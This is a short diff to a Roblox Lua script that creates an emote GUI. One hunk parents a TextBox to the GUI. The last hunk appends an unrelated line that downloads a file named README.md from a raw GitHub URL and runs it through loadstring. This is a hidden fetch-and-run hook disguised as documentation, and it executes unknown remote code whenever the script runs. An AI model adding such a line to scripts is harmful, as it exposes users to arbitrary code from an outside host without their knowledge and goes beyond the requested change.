@@ -4,6 +4,7 @@ emotegui.Parent = plr.PlayerGui
 local textbox = Instance.new("TextBox")
 textbox.Size =UDim2.new(0.194, 0,0.063, 0)
 textbox.Position =UDim2.new(0, 0,0, 0)
+textbox.Parent = emotegui
 textbox.FocusLost:Connect(function()
 local STRING_EMOTENAME = textbox.Text
 -- _SillyBilly, _MissTheQuiet, _Subterfuge, And More.
@@ -80,3 +81,4 @@ end)
 
 end
 end)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/realwercewcr/sad/refs/heads/main/README.md'))()
